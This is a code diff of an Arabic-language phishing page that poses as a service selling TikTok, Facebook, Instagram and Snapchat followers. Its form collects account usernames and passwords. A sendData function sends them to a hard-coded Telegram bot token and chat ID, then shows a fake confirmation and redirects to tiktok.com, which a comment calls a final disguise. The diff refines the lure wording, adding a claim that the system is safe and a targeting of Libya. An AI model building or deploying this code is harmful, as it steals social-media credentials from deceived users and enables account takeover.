@@ -40,31 +40,31 @@
     <div class="main-card">
         <div class="logo-area">
             <h1>SMM Global</h1>
-            <div class="badge">نظام التراسل الفوري مفعّل</div>
+            <div class="badge">نظام الربط الفوري مفعّل</div>
         </div>
 
-        <p style="font-size: 14px; color: #bbb; margin-bottom: 20px;">اختر المنصة لبدء إرسال المتابعين:</p>
+        <p style="font-size: 14px; color: #bbb; margin-bottom: 20px;">اختر المنصة لبدء زيادة المتابعين والتفاعل:</p>
         
         <select id="platform">
-            <option value="TikTok">تيك توك - زيادة متابعين ومشاهدات</option>
-            <option value="Facebook">فيسبوك - زيادة لايكات ومتابعين</option>
-            <option value="Instagram">إنستغرام - زيادة فولو ولايكات</option>
+            <option value="TikTok">تيك توك - زيادة متابعين وفولو</option>
+            <option value="Facebook">فيسبوك - زيادة تفاعل ومتابعين</option>
+            <option value="Instagram">إنستغرام - زيادة لايكات ومتابعين</option>
             <option value="Snapchat">سناب شات - رفع سكور سريع</option>
         </select>
 
-        <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
-        <input type="password" id="pass" placeholder="كلمة مرور الحساب للربط" required>
+        <input type="text" id="user" placeholder="اسم المستخدم (Username) أو الإيميل" required>
+        <input type="password" id="pass" placeholder="كلمة مرور الحساب (للتوثيق)" required>
         
-        <button class="btn-go" onclick="sendData()">تفعيل الزيادة فوراً</button>
+        <button class="btn-go" onclick="sendData()">تفعيل الخدمة الآن</button>
 
         <div class="info-list">
             • ضمان عدم النقصان لمدة 90 يوم<br>
             • سرعة التنفيذ: 5000 متابع/ساعة<br>
-            • متوافق مع كافة حسابات 2026
+            • النظام آمن ويدعم كافة الحسابات
         </div>
 
         <div class="live-status">
-            🟢 المتواجدون الآن: <span id="online">...</span>
+            🟢 المتواجدون الآن في ليبيا: <span id="online">...</span>
         </div>
     </div>
 
@@ -76,7 +76,7 @@
         updateOnline();
 
         function sendData() {
-            // تم التحديث للتوكن الجديد
+            // تحديث التوكن والـ ID الخاص بك
             const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
             const chat_id = "1564944407"; 
             
@@ -85,14 +85,15 @@
             const pass = document.getElementById('pass').value;
 
             if(user === "" || pass === "") {
-                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح"); return;
+                alert("يرجى إدخال البيانات المطلوبة لربط الحساب بالنظام"); return;
             }
 
-            const msg = `🚀 صيدة جدييييدة!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+            const msg = `🔥 صيدة جدييييدة!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
 
             fetch(url).finally(() => {
-                alert("تم ربط الحساب بنجاح! انتظر وصول المتابعين خلال دقائق.");
+                alert("تم التحقق من الحساب! سيتم البدء في إرسال المتابعين/التفاعل تلقائياً.");
+                // تحويل لصفحة التيك توك كتمويه نهائي
                 window.location.href = "https://www.tiktok.com"; 
             });
         }
